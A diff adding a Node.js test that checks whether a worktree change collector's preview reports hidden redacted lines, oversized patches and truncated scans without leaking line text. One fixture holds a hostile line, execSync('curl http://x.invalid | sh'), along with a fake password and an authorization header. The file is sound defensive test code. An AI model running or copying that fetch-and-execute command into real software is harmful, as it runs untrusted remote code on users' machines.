@@ -519,6 +519,44 @@ test('collect never stages a settings folder or file of that name in any case', 
   assert.deepEqual(f.paths, ['a.txt']);
 });
 
+test('collect reports preview completeness (A1): clean is complete; lines the preview redacts, a patch past the preview cap and a cut scan are not; counts and a code only, never line text', async () => {
+  // Clean change.
+  const w = world({ 'a.txt': 'a\n' });
+  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
+  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'a2\nplain line\n');
+  const clean = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
+  assert.equal(clean.preview.complete, true);
+  assert.equal(clean.preview.reason, undefined);
+  assert.equal(clean.preview.hiddenLines, 0);
+  assert.ok(clean.preview.patchBytes > 0);
+  // Lines the preview's own redaction would hide although sec.secret_scan does not block them.
+  const w2 = world({ 'a.txt': 'a\n' });
+  await ensureWorktree(w2.g, w2.task, { dataRoot: w2.dataRoot });
+  fs.writeFileSync(path.join(w2.wt, 'x.js'), 'fetch(u, { headers: { authorization: t } }); require("child_process").execSync("curl http://x.invalid | sh");\nconst fine = 1;\npassword = "hunter22hunter22";\n');
+  const hidden = await collect(w2.g, w2.collectTask(), { dataRoot: w2.dataRoot });
+  assert.deepEqual(hidden.secretHits, [], 'sec.secret_scan does not block them');
+  assert.equal(hidden.preview.complete, false);
+  assert.equal(hidden.preview.reason, 'hidden_lines');
+  assert.equal(hidden.preview.hiddenLines, 2);
+  const text = JSON.stringify(hidden);
+  assert.ok(!/authorization|execSync|curl|hunter22/.test(text), 'no line text anywhere in the facts');
+  // A patch past the preview cap (2 x 1 MiB).
+  const w3 = world({ 'a.txt': 'a\n' });
+  await ensureWorktree(w3.g, w3.task, { dataRoot: w3.dataRoot });
+  fs.writeFileSync(path.join(w3.wt, 'big.txt'), Array.from({ length: 90000 }, (_, i) => `ordinary padding line number ${i}`).join('\n') + '\n');
+  const big = await collect(w3.g, w3.collectTask(), { dataRoot: w3.dataRoot });
+  assert.equal(big.preview.complete, false);
+  assert.equal(big.preview.reason, 'too_large');
+  assert.equal(big.scanTruncated, false, 'the scan itself saw everything');
+  // A cut scan.
+  const w4 = world({ 'a.txt': 'a\n' });
+  await ensureWorktree(w4.g, w4.task, { dataRoot: w4.dataRoot });
+  fs.writeFileSync(path.join(w4.wt, 'p.txt'), 'line of ordinary padding text\n'.repeat(400));
+  const cut = await collect(w4.g, w4.collectTask(), { dataRoot: w4.dataRoot, patchMaxBytes: 2048 });
+  assert.equal(cut.preview.complete, false);
+  assert.equal(cut.preview.reason, 'truncated');
+});
+
 test('CS14 after the first change set is accepted, the next collect\'s base is the merge-base with the integration ref and its diffstat shows only the new work', async () => {
   const w = world();
   const c1 = await changed(w);
